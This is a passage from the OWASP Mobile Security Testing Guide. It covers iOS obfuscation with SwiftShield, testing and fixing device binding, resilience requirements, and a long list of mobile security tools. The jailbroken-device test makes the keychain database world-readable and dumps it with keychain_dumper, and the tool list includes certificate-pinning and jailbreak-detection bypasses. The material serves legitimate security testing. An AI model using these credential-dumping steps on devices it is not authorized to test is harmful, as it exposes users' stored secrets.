\paragraph{String Encryption}\label{string-encryption}}

Applications are often compiled with hardcoded keys, licences, tokens
and endpoint URLs. By default, all of them are stored in plaintext in
the data section of an application's binary. This technique encrypts
these values and injects stubs of code into the program that will
decrypt that data before it is used by the program.

\hypertarget{recommended-tools}{%
\paragraph{Recommended Tools}\label{recommended-tools}}

\begin{itemize}
\tightlist
\item
  \href{https://github.com/rockbruno/swiftshield}{SwiftShield} can be
  used to perform name obfuscation. It reads the source code of the
  Xcode project and replaces all names of classes, methods and fields
  with random values before the compiler is used.
\item
  \href{https://github.com/obfuscator-llvm}{obfuscator-llvm} operates on
  the Intermediate Representation (IR) instead of the source code. It
  can be used for symbol obfuscation, string encryption and control flow
  flattening. Since it's based on IR, it can hide out significantly more
  information about the application as compared to SwiftShield.
\end{itemize}

\hypertarget{how-to-use-swiftshield}{%
\paragraph{How to use SwiftShield}\label{how-to-use-swiftshield}}

\begin{quote}
Warning: SwiftShield irreversibly overwrites all your source files.
Ideally, you should have it run only on your CI server, and on release
builds.
\end{quote}

\href{https://github.com/rockbruno/swiftshield}{SwiftShield} is a tool
that generates irreversible, encrypted names for your iOS project's
objects (including your Pods and Storyboards). This raises the bar for
reverse engineers and will produce less helpful output when using
reverse engineering tools such as class-dump and Frida.

A sample Swift project is used to demonstrate the usage of SwiftShield.

\begin{itemize}
\tightlist
\item
  Check out \url{https://github.com/sushi2k/SwiftSecurity}.
\item
  Open the project in Xcode and make sure that the project is building
  successfully (Product / Build or Apple-Key + B).
\item
  \href{https://github.com/rockbruno/swiftshield/releases}{Download} the
  latest release of SwiftShield and unzip it.
\item
  Go to the directory where you downloaded SwiftShield and copy the
  swiftshield executable to \texttt{/usr/local/bin}:
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\FunctionTok{cp}\NormalTok{ swiftshield/swiftshield /usr/local/bin/}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\tightlist
\item
  In your terminal go into the SwiftSecurity directory (which you
  checked out in step 1) and execute the command swiftshield (which you
  downloaded in step 3):
\end{itemize}

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\BuiltInTok{cd}\NormalTok{ SwiftSecurity}
\NormalTok{$ }\ExtensionTok{swiftshield}\NormalTok{ {-}automatic {-}project{-}root . {-}automatic{-}project{-}file SwiftSecurity.xcodeproj {-}automatic{-}project{-}scheme SwiftSecurity}
\ExtensionTok{SwiftShield}\NormalTok{ 3.4.0}
\ExtensionTok{Automatic}\NormalTok{ mode}
\ExtensionTok{Building}\NormalTok{ project to gather modules and compiler arguments...}
\ExtensionTok{{-}{-}}\NormalTok{ Indexing ReverseEngineeringToolsChecker.swift {-}{-}}
\ExtensionTok{Found}\NormalTok{ declaration of ReverseEngineeringToolsChecker (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC)}
\ExtensionTok{Found}\NormalTok{ declaration of amIReverseEngineered (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC20amIReverseEngineeredSbyFZ)}
\ExtensionTok{Found}\NormalTok{ declaration of checkDYLD (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC9checkDYLD33\_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)}
\ExtensionTok{Found}\NormalTok{ declaration of checkExistenceOfSuspiciousFiles (s:13SwiftSecurity30ReverseEngineeringToolsCheckerC31checkExistenceOfSuspiciousFiles33\_D6FE91E9C9AEC4D13973F8ABFC1AC788LLSbyFZ)}
\ExtensionTok{...}
\end{Highlighting}
\end{Shaded}

SwiftShield is now detecting class and method names and is replacing
their identifier with an encrypted value.

In the original source code you can see all the class and method
identifiers:

\begin{figure}
\centering
\includegraphics[width=5.72917in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/0578a17ea75d138074bdaae5284ec9b7ebabe3ea.png}
\caption{Images/Chapters/0x06j/no\_obfuscation.png}
\end{figure}

SwiftShield was now replacing all of them with encrypted values that
leave no trace to their original name or intention of the class/method:

\begin{figure}
\centering
\includegraphics[width=6.77083in,height=\textheight]{/tmp/tex2pdf.-b81d3c9506d190f0/4353ea9e0ca8fb1454b4d8eb9dfa0b42c7673cf9.png}
\caption{Images/Chapters/0x06j/swiftshield\_obfuscated.png}
\end{figure}

After executing \texttt{swiftshield} a new directory will be created
called \texttt{swiftshield-output}. In this directory another directory
is created with a timestamp in the folder name. This directory contains
a text file called \texttt{conversionMap.txt}, that maps the encrypted
strings to their original values.

\begin{Shaded}
\begin{Highlighting}[]
\NormalTok{$ }\FunctionTok{cat}\NormalTok{ conversionMap.txt}
\ExtensionTok{//}
\ExtensionTok{//}\NormalTok{ SwiftShield Conversion Map}
\ExtensionTok{//}\NormalTok{ Automatic mode for SwiftSecurity, 2020{-}01{-}02 13.51.03}
\ExtensionTok{//}\NormalTok{ Deobfuscate crash logs (or any text file) }\ExtensionTok{by}\NormalTok{ running:}
\ExtensionTok{//}\NormalTok{ swiftshield {-}deobfuscate CRASH\_FILE {-}deobfuscate\_map THIS\_FILE}
\ExtensionTok{//}

\ExtensionTok{ViewController}\NormalTok{ ===}\OperatorTok{>}\NormalTok{ hTOUoUmUcEZUqhVHRrjrMUnYqbdqWByU}
\ExtensionTok{viewDidLoad}\NormalTok{ ===}\OperatorTok{>}\NormalTok{ DLaNRaFbfmdTDuJCPFXrGhsWhoQyKLnO}
\ExtensionTok{sceneDidBecomeActive}\NormalTok{ ===}\OperatorTok{>}\NormalTok{ SUANAnWpkyaIWlGUqwXitCoQSYeVilGe}
\ExtensionTok{AppDelegate}\NormalTok{ ===}\OperatorTok{>}\NormalTok{ KftEWsJcctNEmGuvwZGPbusIxEFOVcIb}
\ExtensionTok{Deny\_Debugger}\NormalTok{ ===}\OperatorTok{>}\NormalTok{ lKEITOpOvLWCFgSCKZdUtpuqiwlvxSjx}
\ExtensionTok{Button\_Emulator}\NormalTok{ ===}\OperatorTok{>}\NormalTok{ akcVscrZFdBBYqYrcmhhyXAevNdXOKeG}
\end{Highlighting}
\end{Shaded}

This is needed for
\href{https://github.com/rockbruno/swiftshield\#-deobfuscating-encrypted-crash-logs}{deobfuscating
encrypted crash logs}.

Another example project is available in SwiftShield's
\href{https://github.com/rockbruno/swiftshield/tree/master/ExampleProject}{Github
repo}, that can be used to test the execution of SwiftShield.

\hypertarget{effectiveness-assessment-9}{%
\paragraph{Effectiveness Assessment}\label{effectiveness-assessment-9}}

Attempt to disassemble the Mach-O in the IPA and any included library
files in the ``Frameworks'' directory (.dylib or .framework files), and
perform static analysis. At the very least, the app's core functionality
(i.e., the functionality meant to be obfuscated) shouldn't be easily
discerned. Verify that:

\begin{itemize}
\tightlist
\item
  meaningful identifiers, such as class names, method names, and
  variable names, have been discarded.
\item
  string resources and strings in binaries are encrypted.
\item
  code and data related to the protected functionality is encrypted,
  packed, or otherwise concealed.
\end{itemize}

For a more detailed assessment, you need a detailed understanding of the
relevant threats and the obfuscation methods used.

\hypertarget{device-binding-mstg-resilience-10}{%
\subsubsection{Device Binding
(MSTG-RESILIENCE-10)}\label{device-binding-mstg-resilience-10}}

\hypertarget{overview-82}{%
\paragraph{Overview}\label{overview-82}}

The purpose of device binding is to impede an attacker who tries to copy
an app and its state from device A to device B and continue the
execution of the app on device B. After device A has been determined
trusted, it may have more privileges than device B. This situation
shouldn't change when an app is copied from device A to device B.

\href{https://developer.apple.com/library/content/releasenotes/General/RN-iOSSDK-7.0/index.html}{Since
iOS 7.0}, hardware identifiers (such as MAC addresses) are off-limits.
The ways to bind an application to a device are based on
\texttt{identifierForVendor}, storing something in the Keychain, or
using Google's InstanceID for iOS. See the
``\protect\hyperlink{remediation}{Remediation}'' section for more
details.

\hypertarget{static-analysis-84}{%
\paragraph{Static Analysis}\label{static-analysis-84}}

When the source code is available, there are a few bad coding practices
you can look for, such as

\begin{itemize}
\tightlist
\item
  MAC addresses: there are several ways to find the MAC address. When
  you use \texttt{CTL\_NET} (a network subsystem) or
  \texttt{NET\_RT\_IFLIST} (getting the configured interfaces) or when
  the mac-address gets formatted, you'll often see formatting code for
  printing, such as \texttt{"\%x:\%x:\%x:\%x:\%x:\%x"}.
\item
  using the UDID:
  \texttt{{[}{[}{[}UIDevice\ currentDevice{]}\ identifierForVendor{]}\ UUIDString{]};}
  and \texttt{UIDevice.current.identifierForVendor?.uuidString} in
  Swift3.
\item
  Any Keychain- or filesystem-based binding, which isn't protected by
  \texttt{SecAccessControlCreateFlags} or and doesn't use protection
  classes, such as \texttt{kSecAttrAccessibleAlways} and
  \texttt{kSecAttrAccessibleAlwaysThisDeviceOnly}.
\end{itemize}

\hypertarget{dynamic-analysis-79}{%
\paragraph{Dynamic Analysis}\label{dynamic-analysis-79}}

There are several ways to test the application binding.

\hypertarget{dynamic-analysis-with-a-simulator}{%
\subparagraph{Dynamic Analysis with A
Simulator}\label{dynamic-analysis-with-a-simulator}}

Take the following steps when you want to verify app-binding in a
simulator:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Run the application on a simulator.
\item
  Make sure you can raise the trust in the application instance (e.g.,
  authenticate in the app).
\item
  Retrieve the data from the Simulator:

  \begin{itemize}
  \tightlist
  \item
    Because simulators use UUIDs to identify themselves, you can make
    locating the storage easier by creating a debug point and executing
    \texttt{po\ NSHomeDirectory()} on that point, which will reveal the
    location of the simulator's stored contents. You can also execute
    \texttt{find\ \textasciitilde{}/Library/Developer/CoreSimulator/Devices/\ \textbar{}\ grep\ \textless{}appname\textgreater{}}
    for the suspected plist file.
  \item
    Go to the directory indicated by the given command's output.
  \item
    Copy all three found folders (Documents, Library, tmp).
  \item
    Copy the contents of the Keychain. Since iOS 8, this has been in
    \texttt{\textasciitilde{}/Library/Developer/CoreSimulator/Devices/\textless{}Simulator\ Device\ ID\textgreater{}/data/Library/Keychains}.
  \end{itemize}
\item
  Start the application on another simulator and find its data location
  as described in step 3.
\item
  Stop the application on the second simulator. Overwrite the existing
  data with the data copied in step 3.
\item
  Can you continue in an authenticated state? If so, then binding may
  not be working properly.
\end{enumerate}

We are saying that the binding ``may'' not be working because not
everything is unique in simulators.

\hypertarget{dynamic-analysis-using-two-jailbroken-devices}{%
\subparagraph{Dynamic Analysis Using Two Jailbroken
Devices}\label{dynamic-analysis-using-two-jailbroken-devices}}

Take the following steps when you want to verify app-binding with two
jailbroken devices:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\tightlist
\item
  Run the app on your jailbroken device.
\item
  Make sure you can raise the trust in the application instance (e.g.,
  authenticate in the app).
\item
  Retrieve the data from the jailbroken device:

  \begin{itemize}
  \tightlist
  \item
    You can SSH into your device and extract the data (as with a
    simulator, either use debugging or
    \texttt{find\ /private/var/mobile/Containers/Data/Application/\ \textbar{}grep\ \textless{}name\ of\ app\textgreater{}}).
    The directory is in
    \texttt{/private/var/mobile/Containers/Data/Application/\textless{}Application\ uuid\textgreater{}}.
  \item
    SSH into the directory indicated by the given command's output or
    use SCP
    (\texttt{scp\ \textless{}ipaddress\textgreater{}:/\textless{}folder\_found\_in\_previous\_step\textgreater{}\ targetfolder})
    to copy the folders and it's data. You can use an FTP client like
    Filezilla as well.
  \item
    Retrieve the data from the keychain, which is stored in
    \texttt{/private/var/Keychains/keychain-2.db}, which you can
    retrieve using the
    \href{https://github.com/ptoomey3/Keychain-Dumper}{keychain dumper}.
    First make the keychain world-readable
    (\texttt{chmod\ +r\ /private/var/Keychains/keychain-2.db}), then
    execute it (\texttt{./keychain\_dumper\ -a}).
  \end{itemize}
\item
  Install the application on the second jailbroken device.
\item
  Overwrite the application data extracted during step 3. The Keychain
  data must be added manually.
\item
  Can you continue in an authenticated state? If so, then binding may
  not be working properly.
\end{enumerate}

\hypertarget{remediation}{%
\paragraph{Remediation}\label{remediation}}

Before we describe the usable identifiers, let's quickly discuss how
they can be used for binding. There are three methods for device binding
in iOS:

\begin{itemize}
\tightlist
\item
  You can use
  \texttt{{[}{[}UIDevice\ currentDevice{]}\ identifierForVendor{]}} (in
  Objective-C),
  \texttt{UIDevice.current.identifierForVendor?.uuidString} (in Swift3),
  or \texttt{UIDevice.currentDevice().identifierForVendor?.UUIDString}
  (in Swift2). The value of \texttt{identifierForVendor} may not be the
  same if you reinstall the app after other apps from the same vendor
  are installed and it may change when you update your app bundle's
  name. Therefore it is best to combine it with something in the
  Keychain.
\item
  You can store something in the Keychain to identify the application's
  instance. To make sure that this data is not backed up, use
  \texttt{kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly} (if you want
  to secure the data and properly enforce a passcode or Touch ID
  requirement),
  \texttt{kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly}, or
  \texttt{kSecAttrAccessibleWhenUnlockedThisDeviceOnly}.
\item
  You can use Google and its Instance ID for
  \href{https://developers.google.com/instance-id/guides/ios-implementation}{iOS}.
\end{itemize}

Any scheme based on these methods will be more secure the moment a
passcode and/or Touch ID is enabled, the materials stored in the
Keychain or filesystem are protected with protection classes (such as
\texttt{kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly} and
\texttt{kSecAttrAccessibleWhenUnlockedThisDeviceOnly}), and the
\texttt{SecAccessControlCreateFlags} is set either with
\texttt{kSecAccessControlDevicePasscode} (for passcodes),
\texttt{kSecAccessControlUserPresence} (passcode, Face ID or Touch ID),
\texttt{kSecAccessControlBiometryAny} (Face ID or Touch ID) or
\texttt{kSecAccessControlBiometryCurrentSet} (Face ID / Touch ID: but
current enrolled biometrics only).

\hypertarget{references-24}{%
\subsubsection{References}\label{references-24}}

\begin{itemize}
\tightlist
\item
  {[}\#geist{]} Dana Geist, Marat Nigmatullin. Jailbreak/Root Detection
  Evasion Study on iOS and Android -
  \url{https://github.com/crazykid95/Backup-Mobile-Security-Report/blob/master/Jailbreak-Root-Detection-Evasion-Study-on-iOS-and-Android.pdf}
\item
  Jan Seredynski. A security review of 1,300 AppStore applications (5
  April 2020) -
  \url{https://seredynski.com/articles/a-security-review-of-1300-appstore-applications.html}
\end{itemize}

\hypertarget{owasp-masvs-19}{%
\paragraph{OWASP MASVS}\label{owasp-masvs-19}}

\begin{itemize}
\tightlist
\item
  MSTG-RESILIENCE-1: ``The app detects, and responds to, the presence of
  a rooted or jailbroken device either by alerting the user or
  terminating the app.''
\item
  MSTG-RESILIENCE-2: ``The app prevents debugging and/or detects, and
  responds to, a debugger being attached. All available debugging
  protocols must be covered.''
\item
  MSTG-RESILIENCE-3: ``The app detects, and responds to, tampering with
  executable files and critical data within its own sandbox.''
\item
  MSTG-RESILIENCE-4: ``The app detects, and responds to, the presence of
  widely used reverse engineering tools and frameworks on the device.''
\item
  MSTG-RESILIENCE-5: ``The app detects, and responds to, being run in an
  emulator.''
\item
  MSTG-RESILIENCE-9: ``Obfuscation is applied to programmatic defenses,
  which in turn impede de-obfuscation via dynamic analysis.''
\item
  MSTG-RESILIENCE-10: ``The app implements a `device binding'
  functionality using a device fingerprint derived from multiple
  properties unique to the device.''
\item
  MSTG-RESILIENCE-11: ``All executable files and libraries belonging to
  the app are either encrypted on the file level and/or important code
  and data segments inside the executables are encrypted or packed.
  Trivial static analysis does not reveal important code or data.''
\end{itemize}

\hypertarget{tools-14}{%
\paragraph{Tools}\label{tools-14}}

\begin{itemize}
\tightlist
\item
  Appsync Unified -
  \url{https://cydia.angelxwind.net/?page/net.angelxwind.appsyncunified}
\item
  Frida - \url{http://frida.re/}
\item
  Keychain Dumper - \url{https://github.com/ptoomey3/Keychain-Dumper}
\end{itemize}

\hypertarget{appendix}{%
\section{Appendix}\label{appendix}}

\hypertarget{testing-tools}{%
\subsection{Testing Tools}\label{testing-tools}}

To perform security testing different tools are available in order to be
able to manipulate requests and responses, decompile apps, investigate
the behavior of running apps and other test cases and automate them.

\begin{quote}
The MSTG project has no preference in any of the tools below, or in
promoting or selling any of the tools. All tools below have been
verified if they are ``alive'', meaning that updates have been pushed
recently. Nevertheless, not all tools have been used/tested by the
authors, but they might still be useful when analyzing a mobile app. The
listing is sorted in alphabetical order. The list is also pointing out
commercial tools. Disclaimer: At the time of writing, we ensure that the
tools being used in the MSTG examples are properly working. However, the
tools might be broken or not work properly depending on your OS version
of both your host computer and your test device. The functioning of the
tooling can be further impeded by whether you're using a
rooted/jailbroken device, the specific version of the rooting/jailbreak
method and/or the version of the tool. The MSTG does not take any
responsibility over the working status of the tools. If you find a
broken tool or example, please search or file an issue in the tool
original page, e.g.~in the GitHub issues page.
\end{quote}

\hypertarget{mobile-application-security-testing-distributions}{%
\subsubsection{Mobile Application Security Testing
Distributions}\label{mobile-application-security-testing-distributions}}

\begin{itemize}
\tightlist
\item
  Androl4b: A virtual machine for assessing Android applications,
  perform reverse engineering and malware analysis -
  \url{https://github.com/sh4hin/Androl4b}
\item
  Android Tamer: A Debian-based Virtual/Live Platform for Android
  Security professionals - \url{https://androidtamer.com/}
\item
  Mobile Security Toolchain: A project used to install many of the tools
  mentioned in this section, both for Android and iOS at a machine
  running macOS. The project installs the tools via Ansible -
  \url{https://github.com/xebia/mobilehacktools}
\end{itemize}

\hypertarget{all-in-one-mobile-security-frameworks}{%
\subsubsection{All-in-One Mobile Security
Frameworks}\label{all-in-one-mobile-security-frameworks}}

\begin{itemize}
\tightlist
\item
  AppMon: An automated framework for monitoring and tampering system API
  calls of native macOS, iOS and Android apps -
  \url{https://github.com/dpnishant/appmon/}
\item
  Mobile Security Framework (MobSF): A mobile pentesting framework,
  capable of performing static and dynamic analysis -
  \url{https://github.com/ajinabraham/Mobile-Security-Framework-MobSF}
\item
  objection: A runtime mobile security assessment framework that does
  not require a jailbroken or rooted device for both iOS and Android,
  due to the usage of Frida -
  \url{https://github.com/sensepost/objection}
\end{itemize}

\hypertarget{static-source-code-analysis-commercial-tools}{%
\subsubsection{Static Source Code Analysis (Commercial
Tools)}\label{static-source-code-analysis-commercial-tools}}

\begin{itemize}
\tightlist
\item
  Checkmarx: Static Source Code Scanner that also scans source code for
  Android and iOS -
  \url{https://www.checkmarx.com/technology/static-code-analysis-sca/}
\item
  Fortify: Static source code scanner that also scans source code for
  Android and iOS -
  \url{https://saas.hpe.com/en-us/software/fortify-on-demand/mobile-security}
\item
  Veracode: Static source code scanner that also scans binaries for
  Android and iOS -
  \url{https://www.veracode.com/products/binary-static-analysis-sast}
\end{itemize}

\hypertarget{dynamic-and-runtime-analysis}{%
\subsubsection{Dynamic and Runtime
Analysis}\label{dynamic-and-runtime-analysis}}

\begin{itemize}
\tightlist
\item
  Frida: A dynamic instrumentation toolkit for developers,
  reverse-engineers, and security researchers. It works using a
  client-server model and allows to inject code into running processes
  on Android and iOS - \url{https://www.frida.re}
\item
  Frida CodeShare: A project hosting Frida scripts publicly that can
  help to bypass client side security controls in mobile apps (e.g.~SSL
  Pinning) - \url{https://codeshare.frida.re/}
\item
  NowSecure Workstation (Commercial Tool): Pre-configured hardware and
  software kit for vulnerability assessment and penetration testing of
  mobile apps -
  \url{https://www.nowsecure.com/solutions/power-tools-for-security-analysts/}
\item
  r2frida: A project merging the powerful reverse engineering
  capabilities of radare2 with the dynamic instrumentation toolkit of
  Frida \url{https://github.com/nowsecure/r2frida}
\end{itemize}

\hypertarget{reverse-engineering-and-static-analysis}{%
\subsubsection{Reverse Engineering and Static
Analysis}\label{reverse-engineering-and-static-analysis}}

\begin{itemize}
\tightlist
\item
  Binary ninja: A multi-platform software disassembler that can be used
  against several executable file formats. It is capable of IR
  (intermediate representation) lifting - \url{https://binary.ninja/}
\item
  Ghidra: An open source software reverse engineering suite of tools
  developed by the National Security Agency (NSA). Its main capabilities
  include disassembly, assembly, decompilation, graphing, and scripting
  - \url{https://ghidra-sre.org/}
\item
  HopperApp (Commercial Tool): A reverse engineering tool for macOS and
  Linux used to disassemble, decompile and debug 32/64bits Intel Mac,
  Linux, Windows and iOS executables - \url{https://www.hopperapp.com/}
\item
  IDA Pro (Commercial Tool): A Windows, Linux or macOS hosted
  multi-processor disassembler and debugger -
  \url{https://www.hex-rays.com/products/ida/index.shtml}
\item
  radare2: radare2 is a unix-like reverse engineering framework and
  command line tools - \url{https://www.radare.org/r/}
\item
  Retargetable Decompiler (RetDec): An open source machine-code
  decompiler based on LLVM. It can be used as a standalone program or as
  a plugin for IDA Pro or radare2 - \url{https://retdec.com/}
\end{itemize}

\hypertarget{tools-for-android}{%
\subsubsection{Tools for Android}\label{tools-for-android}}

\hypertarget{reverse-engineering-and-static-analysis-1}{%
\paragraph{Reverse Engineering and Static
Analysis}\label{reverse-engineering-and-static-analysis-1}}

\begin{itemize}
\tightlist
\item
  Androguard: A python based tool, which can use to disassemble and
  decompile Android apps -
  \url{https://github.com/androguard/androguard}
\item
  Android Backup Extractor: Utility to extract and repack Android
  backups created with adb backup (ICS+). Largely based on
  BackupManagerService.java from AOSP -
  \url{https://github.com/nelenkov/android-backup-extractor}
\item
  Android Debug Bridge (adb): A versatile command line tool used to
  communicate with an emulator instance or connected Android device -
  \url{https://developer.android.com/studio/command-line/adb.html}
\item
  apktool: A tool for reverse engineering 3rd party, closed, binary
  Android apps. It can decode resources to nearly original form and
  rebuild them after making some modifications -
  \url{https://github.com/iBotPeaches/Apktool}
\item
  android-classyshark: A standalone binary inspection tool for Android
  developers - \url{https://github.com/google/android-classyshark}
\item
  ByteCodeViewer: Java 8 Jar and Android APK Reverse Engineering Suite
  (e.g.~Decompiler, Editor and Debugger) -
  \url{https://bytecodeviewer.com/}
\item
  ClassNameDeobfuscator: Simple script to parse through the .smali files
  produced by apktool and extract the .source annotation lines -
  \url{https://github.com/HamiltonianCycle/ClassNameDeobfuscator}
\item
  FindSecurityBugs: FindSecurityBugs is a extension for SpotBugs which
  includes security rules for Java applications -
  \url{https://find-sec-bugs.github.io}
\item
  Jadx (Dex to Java Decompiler): Command line and GUI tools for
  producing Java source code from Android DEX and APK files -
  \url{https://github.com/skylot/jadx}
\item
  Oat2dex: A tool for converting .oat file to .dex files -
  \url{https://github.com/testwhat/SmaliEx}
\item
  Qark: A tool designed to look for several security related Android
  application vulnerabilities, either in source code or packaged APKs -
  \url{https://github.com/linkedin/qark}
\item
  Sign: A Java JAR executable (Sign.jar) which automatically signs an
  APK with the Android test certificate -
  \url{https://github.com/appium/sign}
\item
  Simplify: A tool for de-obfuscating android package into Classes.dex
  which can be use Dex2jar and JD-GUI to extract contents of DEX file -
  \url{https://github.com/CalebFenton/simplify}
\item
  SUPER: A command-line application that can be used in Windows, macOS
  and Linux, that analyzes APK files in search for vulnerabilities -
  \url{https://github.com/SUPERAndroidAnalyzer/super}
\item
  SpotBugs: Static analysis tool for Java -
  \url{https://spotbugs.github.io/}
\end{itemize}

\hypertarget{dynamic-and-runtime-analysis-1}{%
\paragraph{Dynamic and Runtime
Analysis}\label{dynamic-and-runtime-analysis-1}}

\begin{itemize}
\tightlist
\item
  Android Tcpdump: A command line packet capture utility for Android -
  \url{https://www.androidtcpdump.com}
\item
  Drozer: A tool that allows to search for security vulnerabilities in
  apps and devices by assuming the role of an app and interacting with
  the Dalvik VM, other apps' IPC endpoints and the underlying OS -
  \url{https://www.mwrinfosecurity.com/products/drozer/}
\item
  Inspeckage: A tool developed to offer dynamic analysis of Android
  apps. By applying hooks to functions of the Android API, Inspeckage
  helps to understand what an Android application is doing at runtime -
  \url{https://github.com/ac-pm/Inspeckage}
\item
  jdb: A Java Debugger which allows to set breakpoints and print
  application variables. jdb uses the JDWP protocol -
  \url{https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html}
\item
  logcat-color: A colorful and highly configurable alternative to the
  adb logcat command from the Android SDK -
  \url{https://github.com/marshall/logcat-color}
\item
  VirtualHook: A hooking tool for applications on Android ART
  (\textgreater=5.0). It's based on VirtualApp and therefore does not
  require root permission to inject hooks -
  \url{https://github.com/rk700/VirtualHook}
\item
  Xposed Framework: A framework that allows to modify the system or
  application aspect and behavior at runtime, without modifying any
  Android application package (APK) or re-flashing -
  \url{https://forum.xda-developers.com/xposed/xposed-installer-versions-changelog-t2714053}
\end{itemize}

\hypertarget{bypassing-root-detection-and-certificate-pinning}{%
\paragraph{Bypassing Root Detection and Certificate
Pinning}\label{bypassing-root-detection-and-certificate-pinning}}

\begin{itemize}
\tightlist
\item
  Android SSL Trust Killer (Cydia Substrate Module): Blackbox tool to
  bypass SSL certificate pinning for most applications running on a
  device - \url{https://github.com/iSECPartners/Android-SSL-TrustKiller}
\item
  JustTrustMe (Xposed Module): An Xposed Module to bypass SSL
  certificate pinning - \url{https://github.com/Fuzion24/JustTrustMe}
\item
  RootCloak Plus (Cydia Substrate Module): Patch root checking for
  commonly known indications of root -
  \url{https://github.com/devadvance/rootcloakplus}
\item
  SSLUnpinning (Xposed Module): An Xposed Module to bypass SSL
  certificate pinning -
  \url{https://github.com/ac-pm/SSLUnpinning_Xposed}
\end{itemize}

\hypertarget{tools-for-ios}{%
\subsubsection{Tools for iOS}\label{tools-for-ios}}

\hypertarget{access-filesystem-on-idevice}{%
\paragraph{Access Filesystem on
iDevice}\label{access-filesystem-on-idevice}}

\begin{itemize}
\tightlist
\item
  iFunbox: The File and App Management Tool for iPhone, iPad \& iPod
  Touch - \url{http://www.i-funbox.com}
\item
  iProxy: A tool used to connect via SSH to a jailbroken iPhone via USB
  - \url{https://github.com/tcurdt/iProxy}
\item
  itunnel: A tool used to forward SSH via USB -
  \url{https://code.google.com/p/iphonetunnel-usbmuxconnectbyport/downloads/list}
\end{itemize}

Once you are able to SSH into your jailbroken iPhone you can use an FTP
client like the following to browse the file system:

\begin{itemize}
\tightlist
\item
  Cyberduck: Libre FTP, SFTP, WebDAV, S3, Azure \& OpenStack Swift
  browser for Mac and Windows - \url{https://cyberduck.io}
\item
  FileZilla: A solution supporting FTP, SFTP, and FTPS (FTP over
  SSL/TLS) - \url{https://filezilla-project.org/download.php?show_all=1}
\end{itemize}

\hypertarget{reverse-engineering-and-static-analysis-2}{%
\paragraph{Reverse Engineering and Static
Analysis}\label{reverse-engineering-and-static-analysis-2}}

\begin{itemize}
\tightlist
\item
  class-dump: A command-line utility for examining the Objective-C
  runtime information stored in Mach-O files -
  \url{http://stevenygard.com/projects/class-dump/}
\item
  Clutch: Decrypt the application and dump specified bundleID into
  binary or IPA file - \url{https://github.com/KJCracks/Clutch}
\item
  Dumpdecrypted: Dumps decrypted mach-o files from encrypted iPhone
  applications from memory to disk -
  \url{https://github.com/stefanesser/dumpdecrypted}
\item
  hopperscripts: Collection of scripts that can be used to demangle
  Swift function names in HopperApp -
  \url{https://github.com/Januzellij/hopperscripts}
\item
  otool: A tool that displays specified parts of object files or
  libraries - \url{https://www.unix.com/man-page/osx/1/otool/}
\item
  Plutil: A program that can convert .plist files between a binary
  version and an XML version -
  \url{https://www.theiphonewiki.com/wiki/Plutil}
\item
  Weak Classdump: A Cycript script that generates a header file for the
  class passed to the function. Most useful when classdump or
  dumpdecrypted cannot be used, when binaries are encrypted etc -
  \url{https://github.com/limneos/weak_classdump}
\end{itemize}

\hypertarget{dynamic-and-runtime-analysis-2}{%
\paragraph{Dynamic and Runtime
Analysis}\label{dynamic-and-runtime-analysis-2}}

\begin{itemize}
\tightlist
\item
  bfinject: A tool that loads arbitrary dylibs into running App Store
  apps. It has built-in support for decrypting App Store apps, and comes
  bundled with iSpy and Cycript -
  \url{https://github.com/BishopFox/bfinject}
\item
  BinaryCookieReader: A tool to dump all the cookies from the binary
  Cookies.binarycookies file -
  \url{https://securitylearn.net/wp-content/uploads/tools/iOS/BinaryCookieReader.py}
\item
  Burp Suite Mobile Assistant: A tool to bypass certificate pinning and
  is able to inject into apps -
  \url{https://portswigger.net/burp/help/mobile_testing_using_mobile_assistant.html}
\item
  Cycript: A tool that allows developers to explore and modify running
  applications on either iOS or macOS using a hybrid of Objective-C and
  JavaScript syntax through an interactive console that features syntax
  highlighting and tab completion - \url{http://www.cycript.org}
\item
  Frida-cycript: A fork of Cycript including a brand new runtime called
  Mjølner powered by Frida. This enables frida-cycript to run on all the
  platforms and architectures maintained by frida-core -
  \url{https://github.com/nowsecure/frida-cycript}
\item
  Fridpa: An automated wrapper script for patching iOS applications (IPA
  files) and work on non-jailbroken device -
  \url{https://github.com/tanprathan/Fridpa}
\item
  gdb: A tool to perform runtime analysis of iOS applications -
  \url{http://cydia.radare.org/debs/}
\item
  idb: A tool to simplify some common tasks for iOS pentesting and
  research - \url{https://github.com/dmayer/idb}
\item
  Introspy-iOS: Blackbox tool to help understand what an iOS application
  is doing at runtime and assist in the identification of potential
  security issues - \url{https://github.com/iSECPartners/Introspy-iOS}
\item
  keychaindumper: A tool to check which keychain items are available to
  an attacker once an iOS device has been jailbroken -
  \url{https://github.com/ptoomey3/Keychain-Dumper}
\item
  lldb: A debugger by Apple's Xcode used for debugging iOS applications
  - \url{https://lldb.llvm.org/}
\item
  Needle: A modular framework to conduct security assessments of iOS
  apps including Binary Analysis, Static Code Analysis and Runtime
  Manipulation - \url{https://github.com/mwrlabs/needle}
\item
  Passionfruit: Simple iOS app blackbox assessment tool with Fully web
  based GUI. Powered by frida.re and vuejs -
  \url{https://github.com/chaitin/passionfruit}
\end{itemize}

\hypertarget{bypassing-jailbreak-detection-and-ssl-pinning}{%
\paragraph{Bypassing Jailbreak Detection and SSL
Pinning}\label{bypassing-jailbreak-detection-and-ssl-pinning}}

\begin{itemize}
\tightlist
\item
  SSL Kill Switch 2: Blackbox tool to disable SSL certificate validation
  - including certificate pinning - within iOS and macOS Apps -
  \url{https://github.com/nabla-c0d3/ssl-kill-switch2}
\item
  tsProtector: A tool for bypassing Jailbreak detection -
  \url{http://cydia.saurik.com/package/kr.typostudio.tsprotector8}
\item
  Xcon: A tool for bypassing Jailbreak detection -
  \url{http://cydia.saurik.com/package/com.n00neimp0rtant.xcon/}
\end{itemize}

